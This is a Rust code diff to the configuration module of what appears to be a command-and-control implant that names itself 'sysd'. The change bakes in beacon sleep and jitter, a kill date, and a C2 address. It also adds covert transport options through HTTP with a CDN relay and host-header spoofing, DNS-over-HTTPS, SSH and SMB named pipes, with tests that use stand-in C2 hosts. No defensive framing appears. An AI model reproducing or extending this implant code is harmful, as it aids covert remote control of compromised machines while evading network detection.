@@ -18,7 +18,7 @@
 #![allow(unexpected_cfgs)]
 
 use anyhow::{Context as _, Result};
-use common::config::Config;
+use common::config::{Config, SshAuthConfig};
 use hmac::{Hmac, Mac};
 use sha2::{Digest, Sha256};
 use std::path::{Path, PathBuf};
@@ -37,6 +37,24 @@ type HmacSha256 = Hmac<Sha256>;
 const BAKED_SHARED_SECRET: Option<&str> = option_env!("SYS_C_SECRET");
 #[cfg(debug_assertions)]
 const BAKED_CONFIG_HMAC: Option<&str> = option_env!("SYS_CONFIG_HMAC");
+const BAKED_SLEEP_MS: Option<&str> = option_env!("SYS_SLEEP_MS");
+const BAKED_JITTER: Option<&str> = option_env!("SYS_JITTER");
+const BAKED_KILL_DATE: Option<&str> = option_env!("SYS_KILL_DATE");
+const BAKED_C_ADDR: Option<&str> = option_env!("SYS_C_ADDR");
+const BAKED_TRANSPORT: Option<&str> = option_env!("SYS_TRANSPORT");
+const BAKED_HTTP_ENDPOINT: Option<&str> = option_env!("SYS_HTTP_ENDPOINT");
+const BAKED_HTTP_HOST_HEADER: Option<&str> = option_env!("SYS_HTTP_HOST_HEADER");
+const BAKED_DOH_SERVER_URL: Option<&str> = option_env!("SYS_DOH_SERVER_URL");
+const BAKED_DOH_DOMAIN: Option<&str> = option_env!("SYS_DOH_DOMAIN");
+const BAKED_SSH_HOST: Option<&str> = option_env!("SYS_SSH_HOST");
+const BAKED_SSH_PORT: Option<&str> = option_env!("SYS_SSH_PORT");
+const BAKED_SSH_USERNAME: Option<&str> = option_env!("SYS_SSH_USERNAME");
+const BAKED_SSH_AUTH_JSON: Option<&str> = option_env!("SYS_SSH_AUTH_JSON");
+const BAKED_SSH_HOST_KEY_FP: Option<&str> = option_env!("SYS_SSH_HOST_KEY_FP");
+const BAKED_SMB_PIPE_HOST: Option<&str> = option_env!("SYS_SMB_PIPE_HOST");
+const BAKED_SMB_PIPE_NAME: Option<&str> = option_env!("SYS_SMB_PIPE_NAME");
+const BAKED_SMB_PIPE_MODE: Option<&str> = option_env!("SYS_SMB_PIPE_MODE");
+const BAKED_SMB_TCP_RELAY_PORT: Option<&str> = option_env!("SYS_SMB_TCP_RELAY_PORT");
 
 // Dependency note: this module expects `hmac` and `hex` in agent/Cargo.toml.
 // Prompt scope is limited to config.rs, so dependency additions are tracked
@@ -135,6 +153,285 @@ fn update_cache(config: &Config, token: u64) {
     }
 }
 
+#[derive(Default)]
+struct BuildOverrideValues<'a> {
+    sleep_ms: Option<&'a str>,
+    jitter: Option<&'a str>,
+    kill_date: Option<&'a str>,
+    c2_addr: Option<&'a str>,
+    transport: Option<&'a str>,
+    http_endpoint: Option<&'a str>,
+    http_host_header: Option<&'a str>,
+    doh_server_url: Option<&'a str>,
+    doh_domain: Option<&'a str>,
+    ssh_host: Option<&'a str>,
+    ssh_port: Option<&'a str>,
+    ssh_username: Option<&'a str>,
+    ssh_auth_json: Option<&'a str>,
+    ssh_host_key_fingerprint: Option<&'a str>,
+    smb_pipe_host: Option<&'a str>,
+    smb_pipe_name: Option<&'a str>,
+    smb_pipe_mode: Option<&'a str>,
+    smb_tcp_relay_port: Option<&'a str>,
+}
+
+fn apply_baked_build_overrides(config: Config) -> Result<Config> {
+    apply_build_overrides(
+        config,
+        BuildOverrideValues {
+            sleep_ms: BAKED_SLEEP_MS,
+            jitter: BAKED_JITTER,
+            kill_date: BAKED_KILL_DATE,
+            c2_addr: BAKED_C_ADDR,
+            transport: BAKED_TRANSPORT,
+            http_endpoint: BAKED_HTTP_ENDPOINT,
+            http_host_header: BAKED_HTTP_HOST_HEADER,
+            doh_server_url: BAKED_DOH_SERVER_URL,
+            doh_domain: BAKED_DOH_DOMAIN,
+            ssh_host: BAKED_SSH_HOST,
+            ssh_port: BAKED_SSH_PORT,
+            ssh_username: BAKED_SSH_USERNAME,
+            ssh_auth_json: BAKED_SSH_AUTH_JSON,
+            ssh_host_key_fingerprint: BAKED_SSH_HOST_KEY_FP,
+            smb_pipe_host: BAKED_SMB_PIPE_HOST,
+            smb_pipe_name: BAKED_SMB_PIPE_NAME,
+            smb_pipe_mode: BAKED_SMB_PIPE_MODE,
+            smb_tcp_relay_port: BAKED_SMB_TCP_RELAY_PORT,
+        },
+    )
+}
+
+fn apply_build_overrides_from_values(
+    config: Config,
+    sleep_ms: Option<&str>,
+    jitter: Option<&str>,
+    kill_date: Option<&str>,
+) -> Result<Config> {
+    apply_build_overrides(
+        config,
+        BuildOverrideValues {
+            sleep_ms,
+            jitter,
+            kill_date,
+            ..BuildOverrideValues::default()
+        },
+    )
+}
+
+fn apply_build_overrides(mut config: Config, overrides: BuildOverrideValues<'_>) -> Result<Config> {
+    if let Some(raw_sleep_ms) = nonempty(overrides.sleep_ms) {
+        let parsed: u64 = raw_sleep_ms.parse().with_context(|| {
+            format!("SYS_SLEEP_MS must be an unsigned integer, got '{raw_sleep_ms}'")
+        })?;
+        if parsed == 0 {
+            anyhow::bail!("SYS_SLEEP_MS must be greater than zero");
+        }
+        config.sleep.base_interval_ms = Some(parsed);
+        config.sleep.base_interval_secs = parsed.saturating_add(999) / 1000;
+    }
+
+    if let Some(raw_jitter) = nonempty(overrides.jitter) {
+        let parsed: u32 = raw_jitter.parse().with_context(|| {
+            format!("SYS_JITTER must be an integer percentage, got '{raw_jitter}'")
+        })?;
+        if parsed > 100 {
+            anyhow::bail!("SYS_JITTER must be between 0 and 100");
+        }
+        config.sleep.jitter_percent = parsed;
+    }
+
+    if let Some(raw_kill_date) = nonempty(overrides.kill_date) {
+        check_kill_date(raw_kill_date)?;
+        config.malleable_profile.kill_date = raw_kill_date.to_string();
+    }
+
+    apply_transport_override(&mut config, &overrides)?;
+
+    Ok(config)
+}
+
+fn nonempty(value: Option<&str>) -> Option<&str> {
+    value.map(str::trim).filter(|value| !value.is_empty())
+}
+
+fn apply_transport_override(
+    config: &mut Config,
+    overrides: &BuildOverrideValues<'_>,
+) -> Result<()> {
+    let Some(raw_transport) = nonempty(overrides.transport) else {
+        return Ok(());
+    };
+
+    config.malleable_profile.cdn_relay = false;
+    config.malleable_profile.cdn_endpoint.clear();
+    config.malleable_profile.direct_c2_endpoint.clear();
+    config.malleable_profile.dns_over_https = false;
+    config.malleable_profile.doh_server_url = None;
+    config.malleable_profile.ssh_host = None;
+    config.malleable_profile.ssh_port = None;
+    config.malleable_profile.ssh_username = None;
+    config.malleable_profile.ssh_auth = None;
+    config.malleable_profile.ssh_host_key_fingerprint = None;
+    config.malleable_profile.smb_pipe_enabled = false;
+    config.malleable_profile.smb_pipe_host = None;
+    config.malleable_profile.smb_pipe_name = None;
+    config.malleable_profile.smb_pipe_mode = None;
+    config.malleable_profile.smb_tcp_relay_port = None;
+
+    match raw_transport.to_ascii_lowercase().as_str() {
+        "tls" => Ok(()),
+        "http" => {
+            config.malleable_profile.cdn_relay = true;
+            config.malleable_profile.direct_c2_endpoint = nonempty(overrides.http_endpoint)
+                .map(str::to_string)
+                .or_else(|| endpoint_from_c2_addr(overrides.c2_addr, "http", None))
+                .ok_or_else(|| {
+                    anyhow::anyhow!(
+                        "SYS_HTTP_ENDPOINT or SYS_C_ADDR is required for http transport"
+                    )
+                })?;
+            if let Some(host_header) = nonempty(overrides.http_host_header)
+                .map(str::to_string)
+                .or_else(|| host_from_addr(overrides.c2_addr))
+            {
+                config.malleable_profile.host_header = host_header;
+            }
+            Ok(())
+        }
+        "doh" => {
+            config.malleable_profile.dns_over_https = true;
+            config.malleable_profile.doh_server_url = Some(
+                nonempty(overrides.doh_server_url)
+                    .map(str::to_string)
+                    .or_else(|| {
+                        endpoint_from_c2_addr(overrides.c2_addr, "https", Some("/dns-query"))
+                    })
+                    .ok_or_else(|| {
+                        anyhow::anyhow!(
+                            "SYS_DOH_SERVER_URL or SYS_C_ADDR is required for doh transport"
+                        )
+                    })?,
+            );
+            if let Some(domain) = nonempty(overrides.doh_domain)
+                .map(str::to_string)
+                .or_else(|| host_from_addr(overrides.c2_addr))
+            {
+                config.malleable_profile.host_header = domain;
+            }
+            Ok(())
+        }
+        "ssh" => {
+            config.malleable_profile.ssh_host = Some(
+                nonempty(overrides.ssh_host)
+                    .map(str::to_string)
+                    .or_else(|| host_from_addr(overrides.c2_addr))
+                    .ok_or_else(|| {
+                        anyhow::anyhow!("SYS_SSH_HOST or SYS_C_ADDR is required for ssh transport")
+                    })?,
+            );
+            config.malleable_profile.ssh_port = Some(match nonempty(overrides.ssh_port) {
+                Some(port) => port.parse().with_context(|| {
+                    format!("SYS_SSH_PORT must be an unsigned 16-bit integer, got '{port}'")
+                })?,
+                None => 22,
+            });
+            config.malleable_profile.ssh_username = Some(
+                nonempty(overrides.ssh_username)
+                    .map(str::to_string)
+                    .ok_or_else(|| {
+                        anyhow::anyhow!("SYS_SSH_USERNAME is required for ssh transport")
+                    })?,
+            );
+            config.malleable_profile.ssh_auth = Some(parse_ssh_auth(overrides.ssh_auth_json)?);
+            config.malleable_profile.ssh_host_key_fingerprint =
+                nonempty(overrides.ssh_host_key_fingerprint).map(str::to_string);
+            Ok(())
+        }
+        "smb" => {
+            config.malleable_profile.smb_pipe_enabled = true;
+            config.malleable_profile.smb_pipe_host = Some(
+                nonempty(overrides.smb_pipe_host)
+                    .map(str::to_string)
+                    .or_else(|| host_from_addr(overrides.c2_addr))
+                    .ok_or_else(|| {
+                        anyhow::anyhow!(
+                            "SYS_SMB_PIPE_HOST or SYS_C_ADDR is required for smb transport"
+                        )
+                    })?,
+            );
+            config.malleable_profile.smb_pipe_name =
+                nonempty(overrides.smb_pipe_name).map(str::to_string);
+            config.malleable_profile.smb_pipe_mode =
+                nonempty(overrides.smb_pipe_mode).map(str::to_string);
+            config.malleable_profile.smb_tcp_relay_port =
+                match nonempty(overrides.smb_tcp_relay_port) {
+                    Some(port) => Some(port.parse().with_context(|| {
+                        format!(
+                        "SYS_SMB_TCP_RELAY_PORT must be an unsigned 16-bit integer, got '{port}'"
+                    )
+                    })?),
+                    None => None,
+                };
+            Ok(())
+        }
+        other => {
+            anyhow::bail!("SYS_TRANSPORT must be one of tls, http, doh, ssh, smb; got '{other}'")
+        }
+    }
+}
+
+fn parse_ssh_auth(raw: Option<&str>) -> Result<SshAuthConfig> {
+    let raw = nonempty(raw)
+        .ok_or_else(|| anyhow::anyhow!("SYS_SSH_AUTH_JSON is required for ssh transport"))?;
+    serde_json::from_str(raw)
+        .with_context(|| "SYS_SSH_AUTH_JSON is not a valid SshAuthConfig JSON value")
+}
+
+fn endpoint_from_c2_addr(
+    c2_addr: Option<&str>,
+    scheme: &str,
+    path: Option<&str>,
+) -> Option<String> {
+    let addr = nonempty(c2_addr)?;
+    if addr.starts_with("http://") || addr.starts_with("https://") {
+        let mut endpoint = addr.to_string();
+        if let Some(path) = path {
+            let after_scheme = endpoint
+                .split_once("://")
+                .map(|(_, rest)| rest)
+                .unwrap_or(endpoint.as_str());
+            if !after_scheme.contains('/') {
+                endpoint.push_str(path);
+            }
+        }
+        Some(endpoint)
+    } else {
+        Some(format!("{}://{}{}", scheme, addr, path.unwrap_or("")))
+    }
+}
+
+fn host_from_addr(c2_addr: Option<&str>) -> Option<String> {
+    let addr = nonempty(c2_addr)?;
+    let without_scheme = addr.split_once("://").map(|(_, rest)| rest).unwrap_or(addr);
+    let authority = without_scheme.split('/').next()?.trim();
+    if let Some(rest) = authority.strip_prefix('[') {
+        return rest
+            .split_once(']')
+            .map(|(host, _)| host.trim().to_string())
+            .filter(|host| !host.is_empty());
+    }
+    let host = authority
+        .rsplit_once(':')
+        .map(|(host, _)| host)
+        .unwrap_or(authority)
+        .trim();
+    if host.is_empty() {
+        None
+    } else {
+        Some(host.to_string())
+    }
+}
+
 /// Return the default configuration file path.
 ///
 /// Resolves to `~/.config/sysd/agent.toml`. Falls back to
@@ -159,8 +456,8 @@ fn compute_config_hmac(raw_toml: &[u8]) -> Result<Option<[u8; 32]>> {
             return Ok(None);
         }
     };
-    let mut mac = HmacSha256::new_from_slice(key_material.as_bytes())
-        .expect("HMAC key length is valid");
+    let mut mac =
+        HmacSha256::new_from_slice(key_material.as_bytes()).expect("HMAC key length is valid");
     mac.update(raw_toml);
     Ok(Some(mac.finalize().into_bytes().into()))
 }
@@ -180,8 +477,8 @@ fn verify_config_hmac(config_bytes: &[u8], expected_hmac: &str) -> Result<Option
         }
     };
 
-    let expected_bytes = hex::decode(expected_hmac.trim())
-        .with_context(|| "config HMAC is not valid hex")?;
+    let expected_bytes =
+        hex::decode(expected_hmac.trim()).with_context(|| "config HMAC is not valid hex")?;
 
     let mut mac = HmacSha256::new_from_slice(key_material.as_bytes())
         .with_context(|| "failed to initialize HMAC verifier")?;
@@ -229,7 +526,7 @@ pub fn append_config_hmac(config_path: &std::path::Path) -> anyhow::Result<()> {
 pub fn load_config() -> Result<Config> {
     let path = config_path();
     if !path.exists() {
-        let cfg = Config::default();
+        let cfg = apply_baked_build_overrides(Config::default())?;
         update_cache(&cfg, 0);
         return Ok(cfg);
     }
@@ -324,6 +621,8 @@ pub fn load_config() -> Result<Config> {
         }
     }
 
+    let config = apply_baked_build_overrides(config)?;
+
     update_cache(&config, mtime_token);
     Ok(config)
 }
@@ -354,9 +653,7 @@ pub async fn reload_config(handle: &ConfigHandle) -> Result<()> {
 fn is_relevant_change_event(event: &notify::Event, config_file: &Path, sha_file: &Path) -> bool {
     if !matches!(
         event.kind,
-        notify::EventKind::Create(_)
-            | notify::EventKind::Modify(_)
-            | notify::EventKind::Remove(_)
+        notify::EventKind::Create(_) | notify::EventKind::Modify(_) | notify::EventKind::Remove(_)
     ) {
         return false;
     }
@@ -369,10 +666,7 @@ fn is_relevant_change_event(event: &notify::Event, config_file: &Path, sha_file:
     }
 
     event.paths.iter().any(|p| {
-        p == config_file
-            || p == sha_file
-            || p.file_name() == cfg_name
-            || p.file_name() == sha_name
+        p == config_file || p == sha_file || p.file_name() == cfg_name || p.file_name() == sha_name
     })
 }
 
@@ -435,8 +729,7 @@ pub fn spawn_config_watcher(handle: ConfigHandle) -> Result<Option<tokio::task::
             return Ok(None);
         }
 
-        let (tx, mut rx) =
-            tokio::sync::mpsc::unbounded_channel::<notify::Result<notify::Event>>();
+        let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<notify::Result<notify::Event>>();
         let mut watcher = notify::recommended_watcher(move |event| {
             let _ = tx.send(event);
         })
@@ -494,11 +787,20 @@ pub fn spawn_config_watcher(handle: ConfigHandle) -> Result<Option<tokio::task::
 pub fn check_kill_date(kill_date: &str) -> Result<()> {
     let parts: Vec<&str> = kill_date.splitn(3, '-').collect();
     if parts.len() != 3 {
-        anyhow::bail!("invalid kill_date format '{}'; expected YYYY-MM-DD", kill_date);
+        anyhow::bail!(
+            "invalid kill_date format '{}'; expected YYYY-MM-DD",
+            kill_date
+        );
     }
-    let y: u32 = parts[0].parse().map_err(|_| anyhow::anyhow!("invalid kill_date year"))?;
-    let m: u32 = parts[1].parse().map_err(|_| anyhow::anyhow!("invalid kill_date month"))?;
-    let d: u32 = parts[2].parse().map_err(|_| anyhow::anyhow!("invalid kill_date day"))?;
+    let y: u32 = parts[0]
+        .parse()
+        .map_err(|_| anyhow::anyhow!("invalid kill_date year"))?;
+    let m: u32 = parts[1]
+        .parse()
+        .map_err(|_| anyhow::anyhow!("invalid kill_date month"))?;
+    let d: u32 = parts[2]
+        .parse()
+        .map_err(|_| anyhow::anyhow!("invalid kill_date day"))?;
     let kd_val = y * 10_000 + m * 100 + d;
 
     let secs = std::time::SystemTime::now()
@@ -510,7 +812,10 @@ pub fn check_kill_date(kill_date: &str) -> Result<()> {
     let today_val = ty * 10_000 + tm * 100 + td;
 
     if today_val >= kd_val {
-        anyhow::bail!("kill date {} has passed; agent refusing to connect", kill_date);
+        anyhow::bail!(
+            "kill date {} has passed; agent refusing to connect",
+            kill_date
+        );
     }
     Ok(())
 }
@@ -568,6 +873,115 @@ mod tests {
         let deserialized: Config = toml::from_str(&serialized).unwrap();
         assert_eq!(deserialized.allowed_paths, original.allowed_paths);
         assert_eq!(deserialized.heartbeat_interval_secs, 60);
+    }
+
+    #[test]
+    fn baked_build_overrides_apply_behavior_settings() {
+        let cfg = apply_build_overrides_from_values(
+            Config::default(),
+            Some("12345"),
+            Some("37"),
+            Some("2099-12-31"),
+        )
+        .unwrap();
+
+        assert_eq!(cfg.sleep.base_interval_ms, Some(12_345));
+        assert_eq!(cfg.sleep.base_interval_secs, 13);
+        assert_eq!(cfg.sleep.jitter_percent, 37);
+        assert_eq!(cfg.malleable_profile.kill_date, "2099-12-31");
+    }
+
+    #[test]
+    fn baked_transport_overrides_apply_malleable_runtime_settings() {
+        let mut stale_config = Config::default();
+        stale_config.malleable_profile.cdn_endpoint = "stale-cdn.example.com".to_string();
+        stale_config.malleable_profile.ssh_host = Some("stale-ssh.example.com".to_string());
+        let http = apply_build_overrides(
+            stale_config,
+            BuildOverrideValues {
+                c2_addr: Some("c2.example.com:8446"),
+                transport: Some("http"),
+                ..BuildOverrideValues::default()
+            },
+        )
+        .unwrap();
+        assert!(http.malleable_profile.cdn_relay);
+        assert_eq!(
+            http.malleable_profile.direct_c2_endpoint,
+            "http://c2.example.com:8446"
+        );
+        assert!(http.malleable_profile.cdn_endpoint.is_empty());
+        assert!(http.malleable_profile.ssh_host.is_none());
+        assert!(!http.malleable_profile.dns_over_https);
+
+        let doh = apply_build_overrides(
+            Config::default(),
+            BuildOverrideValues {
+                c2_addr: Some("doh.example.com:8445"),
+                transport: Some("doh"),
+                doh_domain: Some("tasks.example.com"),
+                ..BuildOverrideValues::default()
+            },
+        )
+        .unwrap();
+        assert!(doh.malleable_profile.dns_over_https);
+        assert_eq!(
+            doh.malleable_profile.doh_server_url.as_deref(),
+            Some("https://doh.example.com:8445/dns-query")
+        );
+        assert_eq!(doh.malleable_profile.host_header, "tasks.example.com");
+
+        let ssh = apply_build_overrides(
+            Config::default(),
+            BuildOverrideValues {
+                c2_addr: Some("ssh.example.com:2222"),
+                transport: Some("ssh"),
+                ssh_username: Some("operator"),
+                ssh_auth_json: Some(r#"{"type":"agent"}"#),
+                ..BuildOverrideValues::default()
+            },
+        )
+        .unwrap();
+        assert_eq!(
+            ssh.malleable_profile.ssh_host.as_deref(),
+            Some("ssh.example.com")
+        );
+        assert_eq!(ssh.malleable_profile.ssh_port, Some(22));
+        assert_eq!(
+            ssh.malleable_profile.ssh_username.as_deref(),
+            Some("operator")
+        );
+        assert!(matches!(
+            ssh.malleable_profile.ssh_auth,
+            Some(SshAuthConfig::Agent)
+        ));
+
+        let smb = apply_build_overrides(
+            Config::default(),
+            BuildOverrideValues {
+                c2_addr: Some("10.0.0.5:445"),
+                transport: Some("smb"),
+                smb_pipe_name: Some("orchestra"),
+                smb_pipe_mode: Some("tcp_relay"),
+                smb_tcp_relay_port: Some("4455"),
+                ..BuildOverrideValues::default()
+            },
+        )
+        .unwrap();
+        assert!(smb.malleable_profile.smb_pipe_enabled);
+        assert_eq!(
+            smb.malleable_profile.smb_pipe_host.as_deref(),
+            Some("10.0.0.5")
+        );
+        assert_eq!(
+            smb.malleable_profile.smb_pipe_name.as_deref(),
+            Some("orchestra")
+        );
+        assert_eq!(
+            smb.malleable_profile.smb_pipe_mode.as_deref(),
+            Some("tcp_relay")
+        );
+        assert_eq!(smb.malleable_profile.smb_tcp_relay_port, Some(4455));
     }
 
     /// Verify that path validation logic respects the allowed-paths list.
